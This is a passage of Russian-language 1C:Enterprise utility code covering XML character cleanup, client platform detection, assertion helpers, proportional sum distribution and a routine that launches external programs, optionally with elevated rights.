			
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры

// Заменяет недопустимые символы в XML-строке на заданные символы.
//
// Параметры:
//   Текст - Строка - строка, в которой требуется выполнить замену недопустимых символов.
//   СимволЗамены - Строка - строка, на которую требуется выполнить замену недопустимого символа в XML-строке.
// 
// Возвращаемое значение:
//    Строка - строка, полученная заменой недопустимых символов в XML-строке.
//
Функция ЗаменитьНедопустимыеСимволыXML(Знач Текст, СимволЗамены = "" "") Экспорт
	
#Если НЕ ВебКлиент Тогда
	ПозицияНачала = 1;
	Позиция = НайтиНедопустимыеСимволыXML(Текст, ПозицияНачала);
	Пока Позиция > 0 Цикл
		НедопустимыйСимвол = Сред(Текст, Позиция, 1);
		Текст = СтрЗаменить(Текст, НедопустимыйСимвол, СимволЗамены);
		ПозицияНачала = Позиция + СтрДлина(СимволЗамены);
		Если ПозицияНачала > СтрДлина(Текст) Тогда
			Прервать;
		КонецЕсли;
		Позиция = НайтиНедопустимыеСимволыXML(Текст, ПозицияНачала);
	КонецЦикла;
	
	Возврат Текст;
#Иначе
	// Коды символов от 0 до 2^16-1, которые метод НайтиНедопустимыеСимволыXML
	// считает недопустимыми: 0-8, 11-12, 14-31, 55296-57343.
	Итог = """";
	ДлинаСтроки = СтрДлина(Текст);
	
	Для НомерСимвола = 1 По ДлинаСтроки Цикл
		Символ = Сред(Текст, НомерСимвола, 1);
		КодСимвола = КодСимвола(Символ);
		
		Если КодСимвола < 9
		 Или КодСимвола > 10    И КодСимвола < 13
		 Или КодСимвола > 13    И КодСимвола < 32
		 Или КодСимвола > 55295 И КодСимвола < 57344 Тогда
			
			Символ = СимволЗамены;
		КонецЕсли;
		Итог = Итог + Символ;
	КонецЦикла;
	
	Возврат Итог;
#КонецЕсли
	
КонецФункции

// Удаляет недопустимые символы в XML-строке.
//
// Параметры:
//  Текст - Строка - строка, в которой требуется удалить недопустимые символы.
// 
// Возвращаемое значение:
//  Строка - Строка, полученная при удалении недопустимых символов в XML-строке.
//
Функция УдалитьНедопустимыеСимволыXML(Знач Текст) Экспорт
	
	Возврат ЗаменитьНедопустимыеСимволыXML(Текст, """");
	
КонецФункции

// Сравнивает два расписания между собой.
//
// Параметры:
//	Расписание1 - РасписаниеРегламентногоЗадания - первое расписание.
//  Расписание2 - РасписаниеРегламентногоЗадания - второе расписание.
//
// Возвращаемое значение:
//  Булево - Истина, если одинаковые.
//
Функция РасписанияОдинаковые(Знач Расписание1, Знач Расписание2) Экспорт
	
	Возврат Строка(Расписание1) = Строка(Расписание2);
	
КонецФункции

// Возвращает код основного языка конфигурации, например ""ru"".
//
// Возвращаемое значение:
//  Строка - код языка.
//
Функция КодОсновногоЯзыка() Экспорт
	#Если НЕ ТонкийКлиент И НЕ ВебКлиент И НЕ МобильныйКлиент Тогда
		Возврат Метаданные.ОсновнойЯзык.КодЯзыка;
	#Иначе
		Возврат СтандартныеПодсистемыКлиент.ПараметрКлиента(""КодОсновногоЯзыка"");
	#КонецЕсли
КонецФункции

// Возвращает Истина, если клиентское приложение подключено к базе через веб-сервер.
// Если нет клиентского приложения, возвращается Ложь.
//
// Возвращаемое значение:
//  Булево - Истина, если подключен.
//
Функция КлиентПодключенЧерезВебСервер() Экспорт
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Тогда
	УстановитьПривилегированныйРежим(Истина);
	
	СтрокаСоединенияИнформационнойБазы = СтандартныеПодсистемыСервер.ПараметрыКлиентаНаСервере().Получить(""СтрокаСоединенияИнформационнойБазы"");
	
	Если СтрокаСоединенияИнформационнойБазы = Неопределено Тогда
		Возврат Ложь; // Нет клиентского приложения.
	КонецЕсли;
#Иначе
	СтрокаСоединенияИнформационнойБазы = СтрокаСоединенияИнформационнойБазы();
#КонецЕсли
	
	Возврат СтрНайти(ВРег(СтрокаСоединенияИнформационнойБазы), ""WS="") = 1;
	
КонецФункции

// Возвращает Истина, если клиентское приложение запущено под управлением ОС Windows.
//
// Возвращаемое значение:
//  Булево - если нет клиентского приложения, возвращается Ложь.
//
Функция ЭтоWindowsКлиент() Экспорт
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Тогда
	УстановитьПривилегированныйРежим(Истина);
	
	ЭтоWindowsКлиент = СтандартныеПодсистемыСервер.ПараметрыКлиентаНаСервере().Получить(""ЭтоWindowsКлиент"");
	
	Если ЭтоWindowsКлиент = Неопределено Тогда
		Возврат Ложь; // Нет клиентского приложения.
	КонецЕсли;
#Иначе
	СистемнаяИнформация = Новый СистемнаяИнформация;
	
	ЭтоWindowsКлиент = СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86
	             ИЛИ СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86_64;
#КонецЕсли
	
	Возврат ЭтоWindowsКлиент;
	
КонецФункции

// Возвращает Истина, если клиентское приложение запущено под управлением ОС X.
//
// Возвращаемое значение:
//  Булево - если нет клиентского приложения, возвращается Ложь.
//
Функция ЭтоOSXКлиент() Экспорт
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Тогда
	УстановитьПривилегированныйРежим(Истина);
	
	ЭтоOSXКлиент = СтандартныеПодсистемыСервер.ПараметрыКлиентаНаСервере().Получить(""ЭтоOSXКлиент"");
	
	Если ЭтоOSXКлиент = Неопределено Тогда
		Возврат Ложь; // Нет клиентского приложения.
	КонецЕсли;
#Иначе
	СистемнаяИнформация = Новый СистемнаяИнформация;
	
	ЭтоOSXКлиент = СистемнаяИнформация.ТипПлатформы = ТипПлатформы.MacOS_x86
	             ИЛИ СистемнаяИнформация.ТипПлатформы = ТипПлатформы.MacOS_x86_64;
#КонецЕсли
	
	Возврат ЭтоOSXКлиент;
	
КонецФункции

// Возвращает Истина, если клиентское приложение запущено под управлением ОС Linux.
//
// Возвращаемое значение:
//  Булево - если нет клиентского приложения, возвращается Ложь.
//
Функция ЭтоLinuxКлиент() Экспорт
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Тогда
	УстановитьПривилегированныйРежим(Истина);
	
	ЭтоLinuxКлиент = СтандартныеПодсистемыСервер.ПараметрыКлиентаНаСервере().Получить(""ЭтоLinuxКлиент"");
	
	Если ЭтоLinuxКлиент = Неопределено Тогда
		Возврат Ложь; // Нет клиентского приложения.
	КонецЕсли;
#Иначе
	СистемнаяИнформация = Новый СистемнаяИнформация;
	
	ЭтоLinuxКлиент = СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Linux_x86
	             ИЛИ СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Linux_x86_64;
#КонецЕсли
	
	Возврат ЭтоLinuxКлиент;
	
КонецФункции

// Возвращает Истина, если клиентское приложение является Веб-клиентом.
//
// Возвращаемое значение:
//  Булево - если нет клиентского приложения, возвращается Ложь.
//
Функция ЭтоВебКлиент() Экспорт
	
#Если ВебКлиент Тогда
	Возврат Истина;
#ИначеЕсли Сервер Или ТолстыйКлиентОбычноеПриложение Тогда
	УстановитьПривилегированныйРежим(Истина);
	
	ЭтоВебКлиент = СтандартныеПодсистемыСервер.ПараметрыКлиентаНаСервере().Получить(""ЭтоВебКлиент"");
	
	Если ЭтоВебКлиент = Неопределено Тогда
		Возврат Ложь; // Нет клиентского приложения.
	КонецЕсли;
	
	Возврат ЭтоВебКлиент;
#Иначе
	Возврат Ложь;
#КонецЕсли
	
КонецФункции

// Возвращает Истина, если это веб клиент в Mac OS.
//
// Возвращаемое значение:
//  Булево - Истина, если сеанс запущен под веб-клиентом и в Mac OS.
//
Функция ЭтоВебКлиентПодMacOS() Экспорт
	
#Если ВебКлиент Тогда
	Возврат ОбщегоНазначенияКлиентПовтИсп.ЭтоВебКлиентПодMacOS();
#ИначеЕсли Сервер Или ТолстыйКлиентОбычноеПриложение Тогда
	УстановитьПривилегированныйРежим(Истина);
	
	ЭтоВебКлиентПодMacOS = СтандартныеПодсистемыСервер.ПараметрыКлиентаНаСервере().Получить(""ЭтоВебКлиентПодMacOS"");
	
	Если ЭтоВебКлиентПодMacOS = Неопределено Тогда
		Возврат Ложь; // Нет клиентского приложения.
	КонецЕсли;
	
	Возврат ЭтоВебКлиентПодMacOS;
#Иначе
	Возврат Ложь;
#КонецЕсли
	
КонецФункции

// Возвращает Истина, если клиентское приложение является мобильным клиентом.
//
// Возвращаемое значение:
//  Булево - если нет клиентского приложения, возвращается Ложь.
//
Функция ЭтоМобильныйКлиент() Экспорт
	
#Если МобильныйКлиент Тогда
	Возврат Истина;
#ИначеЕсли Сервер Или ТолстыйКлиентОбычноеПриложение Тогда
	УстановитьПривилегированныйРежим(Истина);
	
	ЭтоМобильныйКлиент = СтандартныеПодсистемыСервер.ПараметрыКлиентаНаСервере().Получить(""ЭтоМобильныйКлиент"");
	
	Если ЭтоМобильныйКлиент = Неопределено Тогда
		Возврат Ложь; // Нет клиентского приложения.
	КонецЕсли;
	
	Возврат ЭтоМобильныйКлиент;
#Иначе
	Возврат Ложь;
#КонецЕсли
	
КонецФункции

// Возвращает объем оперативной памяти, доступной клиентскому  приложению.
//
// Возвращаемое значение:
//  Число - количество гигабайт оперативной памяти с точностью до десятых долей.
//  Неопределено - нет клиентского приложения, то есть ТекущийРежимЗапуска() = Неопределено.
//
Функция ОперативнаяПамятьДоступнаяКлиентскомуПриложению() Экспорт
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или  ВнешнееСоединение Тогда
	УстановитьПривилегированныйРежим(Истина);
	ДоступныйОбъем = ПараметрыСеанса.ПараметрыКлиентаНаСервере.Получить(""ОперативнаяПамять"");
#Иначе
	СистемнаяИнформация = Новый  СистемнаяИнформация;
	ДоступныйОбъем = Окр(СистемнаяИнформация.ОперативнаяПамять / 1024,  1);
#КонецЕсли
	
	Возврат ДоступныйОбъем;
	
КонецФункции

// Возвращает Истина, если включен режим отладки.
//
// Возвращаемое значение:
//  Булево - Истина, если включен режим отладки.
Функция РежимОтладки() Экспорт
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
	ПараметрЗапускаПриложения = ПараметрыСеанса.ПараметрыКлиентаНаСервере.Получить(""ПараметрЗапуска"");
#Иначе
	ПараметрЗапускаПриложения = ПараметрЗапуска;
#КонецЕсли
	
	Возврат СтрНайти(ПараметрЗапускаПриложения, ""РежимОтладки"") > 0;
КонецФункции

// Вызывает исключение с текстом Сообщение, если Условие не равно Истина.
// Применяется для самодиагностики кода.
//
// Параметры:
//   Условие                - Булево - если не равно Истина, то вызывается исключение.
//   КонтекстПроверки       - Строка - например, имя процедуры или функции, в которой выполняется проверка.
//   Сообщение              - Строка - текст сообщения. Если не задан, то исключение вызывается с сообщением по
//                                     умолчанию.
//
Процедура Проверить(Знач Условие, Знач Сообщение = """", Знач КонтекстПроверки = """") Экспорт
	
	Если Условие <> Истина Тогда
		Если ПустаяСтрока(Сообщение) Тогда
			ТекстИсключения = НСтр(""ru = 'Недопустимая операция'""); // Assertion failed
		Иначе
			ТекстИсключения = Сообщение;
		КонецЕсли;
		Если Не ПустаяСтрока(КонтекстПроверки) Тогда
			ТекстИсключения = ТекстИсключения + "" "" + СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НСтр(""ru = 'в %1'""), КонтекстПроверки);
		КонецЕсли;
		ВызватьИсключение ТекстИсключения;
	КонецЕсли;
	
КонецПроцедуры

// Вызывает исключение, если тип значения параметра ИмяПараметра процедуры или функции ИмяПроцедурыИлиФункции
// отличается от ожидаемого.
// Для быстрой диагностики типов параметров, передаваемых в процедуры и функции программного интерфейса.
//
// Параметры:
//   ИмяПроцедурыИлиФункции - Строка             - имя процедуры или функции, параметр которой проверяется.
//   ИмяПараметра           - Строка             - имя проверяемого параметра процедуры или функции.
//   ЗначениеПараметра      - Произвольный       - фактическое значение параметра.
//   ОжидаемыеТипы  - ОписаниеТипов, Тип, Массив - тип(ы) параметра процедуры или функции.
//   ОжидаемыеТипыСвойств   - Структура          - если ожидаемый тип - структура, то 
//                                                 в этом параметре можно указать типы ее свойств.
//
Процедура ПроверитьПараметр(Знач ИмяПроцедурыИлиФункции, Знач ИмяПараметра, Знач ЗначениеПараметра, 
	Знач ОжидаемыеТипы, Знач ОжидаемыеТипыСвойств = Неопределено) Экспорт
	
	Контекст = ""ОбщегоНазначенияКлиентСервер.ПроверитьПараметр"";
	Проверить(ТипЗнч(ИмяПроцедурыИлиФункции) = Тип(""Строка""), 
		НСтр(""ru = 'Недопустимое значение параметра ИмяПроцедурыИлиФункции'""), Контекст);
	Проверить(ТипЗнч(ИмяПараметра) = Тип(""Строка""), 
		НСтр(""ru = 'Недопустимое значение параметра ИмяПараметра'""), Контекст);
		
	ЭтоКорректныйТип = ЗначениеОжидаемогоТипа(ЗначениеПараметра, ОжидаемыеТипы);
	Проверить(ЭтоКорректныйТип <> Неопределено, 
		НСтр(""ru = 'Недопустимое значение параметра ОжидаемыеТипы'""), Контекст);
		
	НедопустимыйПараметр = НСтр(""ru = 'Недопустимое значение параметра %1 в %2. 
		|Ожидалось: %3; передано значение: %4 (тип %5).'"");
	Проверить(ЭтоКорректныйТип, СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НедопустимыйПараметр,
		ИмяПараметра,
		ИмяПроцедурыИлиФункции,
		ПредставлениеТипов(ОжидаемыеТипы), 
		?(ЗначениеПараметра <> Неопределено, ЗначениеПараметра, НСтр(""ru = 'Неопределено'"")),
		ТипЗнч(ЗначениеПараметра)));
			
	Если ТипЗнч(ЗначениеПараметра) = Тип(""Структура"") И ОжидаемыеТипыСвойств <> Неопределено Тогда
		
		Проверить(ТипЗнч(ОжидаемыеТипыСвойств) = Тип(""Структура""), 
			НСтр(""ru = 'Недопустимое значение параметра ИмяПроцедурыИлиФункции'""), Контекст);
			
		НетСвойства = НСтр(""ru = 'Недопустимое значение параметра %1 (Структура) в %2. 
			|В структуре ожидалось свойство %3 (тип %4).'"");
		НедопустимоеСвойство = НСтр(""ru = 'Недопустимое значение свойства %1 в параметре %2 (Структура) в %3. 
			|Ожидалось: %4; передано значение: %5 (тип %6).'"");
		Для каждого Свойство Из ОжидаемыеТипыСвойств Цикл
			
			ОжидаемоеИмяСвойства = Свойство.Ключ;
			ОжидаемыйТипСвойства = Свойство.Значение;
			ЗначениеСвойства = Неопределено;
			
			Проверить(ЗначениеПараметра.Свойство(ОжидаемоеИмяСвойства, ЗначениеСвойства), 
				СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НетСвойства, ИмяПараметра, ИмяПроцедурыИлиФункции, 
					ОжидаемоеИмяСвойства, ОжидаемыйТипСвойства));
				
			ЭтоКорректныйТип = ЗначениеОжидаемогоТипа(ЗначениеСвойства, ОжидаемыйТипСвойства);
			Проверить(ЭтоКорректныйТип, СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НедопустимоеСвойство, 
				ОжидаемоеИмяСвойства,
				ИмяПараметра,
				ИмяПроцедурыИлиФункции,
				ПредставлениеТипов(ОжидаемыеТипы), 
				?(ЗначениеСвойства <> Неопределено, ЗначениеСвойства, НСтр(""ru = 'Неопределено'"")),
				ТипЗнч(ЗначениеСвойства)));
		КонецЦикла;
	КонецЕсли;		
	
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Математические процедуры и функции.

// Выполняет пропорциональное распределение суммы в соответствии
// с заданными коэффициентами распределения.
//
// Параметры:
//  РаспределяемаяСумма - Число  - сумма, которую надо распределить, если сумма равна 0 - то возвращается Неопределено;
//                                 Если передана отрицательная - расчет по модулю и после инверсия знаков результата.
//  Коэффициенты        - Массив - коэффициенты распределения, должны быть положительны или отрицательными одновременно
//  Точность            - Число  - точность округления при распределении. Необязателен.
//
// Возвращаемое значение:
//  Массив - массив размерностью равный массиву коэффициентов, содержит
//           суммы в соответствии с весом коэффициента (из массива коэффициентов).
//           В случае, если распределить невозможно (кол-во коэффициентов = 0,
//           есть коэффициенты с отрицательным значением или суммарный вес коэффициентов = 0),
//           тогда будет возвращено Неопределено.
//
// Пример:
//
//	Коэффициенты = Новый Массив;
//	Коэффициенты.Добавить(1);
//	Коэффициенты.Добавить(2);
//	Результат = ОбщегоНазначенияКлиентСервер.РаспределитьСуммуПропорциональноКоэффициентам(1, Коэффициенты);
//	// Результат = [0.33, 0.67]
//
Функция РаспределитьСуммуПропорциональноКоэффициентам(Знач РаспределяемаяСумма, Знач Коэффициенты, Знач Точность = 2) Экспорт
	
	КоэффициентыАбсолютные = Новый Массив(Новый ФиксированныйМассив(Коэффициенты)); // cpy
	
	// Старое поведение при неуказанной сумме - для обратной совместимости.
	Если Не ЗначениеЗаполнено(РаспределяемаяСумма) Тогда 
		Возврат Неопределено;
	КонецЕсли;
	
	Если КоэффициентыАбсолютные.Количество() = 0 Тогда 
		// Недопустимо значение параметра Коэффициенты
		// Ожидалось: хотя бы один коэффициент будет задан.
		Возврат Неопределено;
	КонецЕсли;
	
	ИндексМаксимальногоКоэффициента = 0;
	МаксимальныйКоэффициент = 0;
	СуммаКоэффициентов = 0;
	КоэффициентыОтрицательны = (КоэффициентыАбсолютные[0] < 0);
	
	Для Индекс = 0 По КоэффициентыАбсолютные.Количество() - 1 Цикл
		Коэффициент = КоэффициентыАбсолютные[Индекс];
		
		Если КоэффициентыОтрицательны И Коэффициент > 0 Тогда 
			// Недопустимо значение параметра Коэффициенты
			// Ожидалось: все коэффициенты положительны или все отрицательны одновременно.
			Возврат Неопределено;
		КонецЕсли;
		
		Если Коэффициент < 0 Тогда 
			Коэффициент = -Коэффициент; // Abs(Коэффициент)
			КоэффициентыАбсолютные[Индекс] = Коэффициент; // move
		КонецЕсли;
		
		Если МаксимальныйКоэффициент < Коэффициент Тогда
			МаксимальныйКоэффициент = Коэффициент;
			ИндексМаксимальногоКоэффициента = Индекс;
		КонецЕсли;
		
		СуммаКоэффициентов = СуммаКоэффициентов + Коэффициент;
	КонецЦикла;
	
	Если СуммаКоэффициентов = 0 Тогда
		// Недопустимо значение параметра Коэффициенты
		// Ожидалось: хотя бы один коэффициент будет отличен от нуля.
		Возврат Неопределено;
	КонецЕсли;
	
	Результат = Новый Массив(КоэффициентыАбсолютные.Количество());
	
	ВыполнятьИнверсию = (РаспределяемаяСумма < 0);
	Если ВыполнятьИнверсию Тогда 
		РаспределяемаяСумма = -РаспределяемаяСумма; // Abs(РаспределяемаяСумма).
	КонецЕсли;
	
	РаспределеннаяСумма = 0;
	
	Для Индекс = 0 По КоэффициентыАбсолютные.Количество() - 1 Цикл
		Результат[Индекс] = Окр(РаспределяемаяСумма * КоэффициентыАбсолютные[Индекс] / СуммаКоэффициентов, Точность, 1);
		РаспределеннаяСумма = РаспределеннаяСумма + Результат[Индекс];
	КонецЦикла;
	
	СуммарнаяПогрешность = РаспределяемаяСумма - РаспределеннаяСумма;
	
	Если СуммарнаяПогрешность > 0 Тогда 
		
		// Погрешности округления отнесем на коэффициент с максимальным весом.
		Если Не РаспределеннаяСумма = РаспределяемаяСумма Тогда
			Результат[ИндексМаксимальногоКоэффициента] = Результат[ИндексМаксимальногоКоэффициента] + СуммарнаяПогрешность;
		КонецЕсли;
		
	ИначеЕсли СуммарнаяПогрешность < 0 Тогда 
		
		// Если распределили больше чем положено, размазываем погрешность по ближайшим максимальным весам.
		ЗначениеПогрешности = 1 / Pow(10, Точность);
		КоличествоЭлементовПогрешности = -СуммарнаяПогрешность / ЗначениеПогрешности;
		
		Для Сч = 1 По КоличествоЭлементовПогрешности Цикл 
			МаксимальныйКоэффициент = МаксимальноеЗначениеВМассиве(КоэффициентыАбсолютные);
			Индекс = КоэффициентыАбсолютные.Найти(МаксимальныйКоэффициент);
			Результат[Индекс] = Результат[Индекс] - ЗначениеПогрешности;
			КоэффициентыАбсолютные[Индекс] = 0;
		КонецЦикла;
		
	Иначе 
		// Если СуммарнаяПогрешность = 0, то все идеально.
	КонецЕсли;
	
	Если ВыполнятьИнверсию Тогда 
		Для Индекс = 0 По КоэффициентыАбсолютные.Количество() - 1 Цикл
			Результат[Индекс] = -Результат[Индекс];
		КонецЦикла;
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции

////////////////////////////////////////////////////////////////////////////////
// Процедуры и функции для работы с внешними приложениями.

// Возвращает структуру параметров для см. процедуру ЗапуститьПрограмму.
//
// Возвращаемое значение:
//  ТекущийКаталог - Строка - Задает текущий каталог запускаемого приложения.
//  ДождатьсяЗавершения - Булево - Истина - дожидаться завершения запущенного приложения 
//      перед продолжением работы.
//  ПолучитьПотокВывода - Булево - Истина - результат, направленный в поток stdout,
//      если не указан ДождатьсяЗавершения - игнорируется.
//  ПолучитьПотокОшибок - Булево - Истина - ошибки, направленные в поток stderr,
//      если не указан ДождатьсяЗавершения - игнорируется.
//  ВыполнитьСНаивысшимиПравами - Булево - Истина - требуется запустить программу на исполнение 
//      с повышением привилегий системы:
//      - подтверждение UAC для Windows;
//      - интерактивным запросом c GUI sudo и перенаправлением
//      $DISPLAY и $XAUTHORITY текущего пользователя для Linux;
//      Не совместим с параметром ДождатьсяЗавершения. В MacOS игнорируется.
//  Кодировка - Строка - Код кодировки, устанавливаемый до выполнения пакетной операции.
//      В Linux и macOS игнорируется.
//
Функция ПараметрыЗапускаПрограммы() Экспорт
	
	Параметры = Новый Структура;
	Параметры.Вставить(""ТекущийКаталог"", """");
	Параметры.Вставить(""ДождатьсяЗавершения"", Ложь);
	Параметры.Вставить(""ПолучитьПотокВывода"", Ложь);
	Параметры.Вставить(""ПолучитьПотокОшибок"", Ложь);
	Параметры.Вставить(""ВыполнитьСНаивысшимиПравами"", Ложь); // RunWithElevatedPermissions.
	Параметры.Вставить(""Кодировка"", """");
	
	Возврат Параметры;
	
КонецФункции

// Запускает внешнюю программу в соответствии с параметрами запуска.
// Не доступно в веб-клиенте. 
//
// Параметры:
//  КомандаЗапуска - Строка, Массив - Командная строка для запуска программы.
//      Если Массив, то: первый элемент массива - путь к исполняемому приложению, остальные - передаваемые параметры,
//      массив соответствует тому, который получит вызываемая программа в argv.
//  ПараметрыЗапускаПрограммы - Структура - см. функцию ПараметрыЗапускаПрограммы.
//
// Возвращаемое значение:
//  Структура - Результат работы программы.
//      КодВозврата - Число  - код возврата программы.
//      ПотокВывода - Строка - результат работы программы, направленный в поток stdout.
//      ПотокОшибок - Строка - ошибки исполнения программы, направленные в поток stderr.
//
// Пример:
//	ОбщегоНазначенияКлиентСервер.ЗапуститьПрограмму(""calc"");
//	
//	ПараметрыЗапускаПрограммы = ОбщегоНазначенияКлиентСервер.ПараметрыЗапускаПрограммы();
//	ПараметрыЗапускаПрограммы.ВыполнитьСНаивысшимиПравами = Истина;
//	ОбщегоНазначенияКлиентСервер.ЗапуститьПрограмму(""C:\Program Files\1cv8\common\1cestart.exe"", 
//		ПараметрыЗапускаПрограммы);
//	
//	ПараметрыЗапускаПрограммы = ОбщегоНазначенияКлиентСервер.ПараметрыЗапускаПрограммы();
//	ПараметрыЗапускаПрограммы.ДождатьсяЗавершения = Истина;
//	Результат = ОбщегоНазначенияКлиентСервер.ЗапуститьПрограмму(""ping 127.0.0.1 -n 5"", ПараметрыЗапускаПрограммы);
//
Функция ЗапуститьПрограмму(Знач КомандаЗапуска, ПараметрыЗапускаПрограммы = Неопределено) Экспорт 
	
#Если ВебКлиент ИЛИ МобильныйКлиент Тогда
	ВызватьИсключение НСтр(""ru = 'Запуск программ недоступен в веб-клиенте.'"");
#Иначе
	
	СтрокаКоманды = БезопаснаяСтрокаКоманды(КомандаЗапуска);
	
	Если ПараметрыЗапускаПрограммы = Неопределено Тогда 
		ПараметрыЗапускаПрограммы = ПараметрыЗапускаПрограммы();
	КонецЕсли;
	
	ТекущийКаталог              = ПараметрыЗапускаПрограммы.ТекущийКаталог;
	ДождатьсяЗавершения         = ПараметрыЗапускаПрограммы.ДождатьсяЗавершения;
	ПолучитьПотокВывода         = ПараметрыЗапускаПрограммы.ПолучитьПотокВывода;
	ПолучитьПотокОшибок         = ПараметрыЗапускаПрограммы.ПолучитьПотокОшибок;
	ВыполнитьСНаивысшимиПравами = ПараметрыЗапускаПрограммы.ВыполнитьСНаивысшимиПравами;
	Кодировка                   = ПараметрыЗапускаПрограммы.Кодировка;
	
	Если ВыполнитьСНаивысшимиПравами Тогда 
#Если ВнешнееСоединение Тогда
		ВызватьИсключение 
			НСтр(""ru = 'Недопустимое значение параметра ПараметрыЗапускаПрограммы.ВыполнитьСНаивысшимиПравами.
			           |Повешение привилегий системы не доступно из внешнего соединения.'"");
#КонецЕсли
		
#Если Сервер Тогда
		ВызватьИсключение 
			НСтр(""ru = 'Недопустимое значение параметра ПараметрыЗапускаПрограммы.ВыполнитьСНаивысшимиПравами.
			           |Повешение привилегий системы не доступно на сервере.'"");
#КонецЕсли
		
	КонецЕсли;
	
	СистемнаяИнформация = Новый СистемнаяИнформация();
	Если (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86) 
		Или (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86_64) Тогда
	
		Если Не ПустаяСтрока(Кодировка) Тогда
			СтрокаКоманды = ""chcp "" + Кодировка + "" | "" + СтрокаКоманды;
		КонецЕсли;
	
	КонецЕсли;
	
	Если ДождатьсяЗавершения Тогда 
		
		Если ПолучитьПотокВывода Тогда 
			ФайлПотокаВывода = ПолучитьИмяВременногоФайла(""stdout.tmp"");
			СтрокаКоманды = СтрокаКоманды + "" > """""" + ФайлПотокаВывода + """""""";
		КонецЕсли;
		
		Если ПолучитьПотокОшибок Тогда 
			ФайлПотокаОшибок = ПолучитьИмяВременногоФайла(""stderr.tmp"");
			СтрокаКоманды = СтрокаКоманды + "" 2>"""""" + ФайлПотокаОшибок + """""""";
		КонецЕсли;
		
	КонецЕсли;
	
	КодВозврата = Неопределено;
	
	Если (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86)
		Или (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86_64) Тогда
		
		// Из-за запуска через shell перенаправление каталога требуется сделать командой.
		Если Не ПустаяСтрока(ТекущийКаталог) Тогда 
			СтрокаКоманды = ""cd /D """""" + ТекущийКаталог + """""" && "" + СтрокаКоманды;
		КонецЕсли;
		
		// Выполняется запуск через cmd.exe (для перенаправления stdout и stderr).
		СтрокаКоманды = ""cmd /S /C """" "" + СтрокаКоманды + "" """""";
		
#Если Сервер Тогда
		
		Если ОбщегоНазначения.ИнформационнаяБазаФайловая() Тогда
			// В файловой информационной базе показывать окно консоли не следует и в серверном контексте.
			Оболочка = Новый COMОбъект(""Wscript.Shell"");
			КодВозврата = Оболочка.Run(СтрокаКоманды, 0, ДождатьсяЗавершения);
			Оболочка = Неопределено;
		Иначе 
			ЗапуститьПриложение(СтрокаКоманды,, ДождатьсяЗавершения, КодВозврата);
		КонецЕсли;
		
#Иначе
		
		Если ВыполнитьСНаивысшимиПравами Тогда
			
			Если ДождатьсяЗавершения Тогда
				ВызватьИсключение 
					НСтр(""ru = 'Недопустимо одновременно устанавливать параметры 
					           | - ПараметрыЗапускаПрограммы.ДождатьсяЗавершения и
					           | - ПараметрыЗапускаПрограммы.ВыполнитьСНаивысшимиПравами:
					           |Операционная система не позволяет отслеживать от имени пользователя процессы,
					           |запущенные администратором.'"");
			КонецЕсли;
			
			// После начала исполнения файла команды отследить статус процесса будет невозможно,
			// Потому удалять batch файл следует последней строкой команды в самом batch файле.
			// Асинхронно удалять нельзя, иначе может наступить коллизия, 
			// когда идет попытка удаления, а запуск еще не состоялся.
			
			ФайлКоманды = ПолучитьИмяВременногоФайла(""runas.bat"");
			ЗаписьКоманды = Новый ЗаписьТекста(ФайлКоманды, КодировкаТекста.OEM);
			ЗаписьКоманды.ЗаписатьСтроку(СтрокаКоманды);
			ЗаписьКоманды.ЗаписатьСтроку(""del /f /q """""" + ФайлКоманды + """""""");
			ЗаписьКоманды.Закрыть();
			
			Оболочка = Новый COMОбъект(""Shell.Application"");
			// Запуск с передачей глагола действия - повышения привилегий.
			Оболочка.ShellExecute(""cmd"", ""/c """""" + ФайлКоманды + """""""",, ""runas"", 0);
			Оболочка = Неопределено;
			
		Иначе 
			Оболочка = Новый COMОбъект(""Wscript.Shell"");
			КодВозврата = Оболочка.Run(СтрокаКоманды, 0, ДождатьсяЗавершения);
			Оболочка = Неопределено;
		КонецЕсли;
#КонецЕсли
		
	ИначеЕсли (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Linux_x86) 
		Или (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Linux_x86_64) Тогда
		
		Если ВыполнитьСНаивысшимиПравами Тогда
			
			ШаблонКоманды = ""pkexec env DISPLAY=[DISPLAY] XAUTHORITY=[XAUTHORITY] [СтрокаКоманды]"";
			
			ПараметрыШаблона = Новый Структура;
			ПараметрыШаблона.Вставить(""СтрокаКоманды"", СтрокаКоманды);
			
			ПараметрыЗапускаПодпрограммы = ПараметрыЗапускаПрограммы();
			ПараметрыЗапускаПодпрограммы.ДождатьсяЗавершения = Истина;
			ПараметрыЗапускаПодпрограммы.ПолучитьПотокВывода = Истина;
			
			Результат = ЗапуститьПрограмму(""echo $DISPLAY"", ПараметрыЗапускаПодпрограммы);
			ПараметрыШаблона.Вставить(""DISPLAY"", Результат.ПотокВывода);
			
			Результат = ЗапуститьПрограмму(""echo $XAUTHORITY"", ПараметрыЗапускаПодпрограммы);
			ПараметрыШаблона.Вставить(""XAUTHORITY"", Результат.ПотокВывода);
			
			СтрокаКоманды = СтроковыеФункцииКлиентСервер.ВставитьПараметрыВСтроку(ШаблонКоманды, ПараметрыШаблона);
			ДождатьсяЗавершения = Истина;
			
		КонецЕсли;
		
		ЗапуститьПриложение(СтрокаКоманды, ТекущийКаталог, ДождатьсяЗавершения, КодВозврата);
		
	Иначе
		
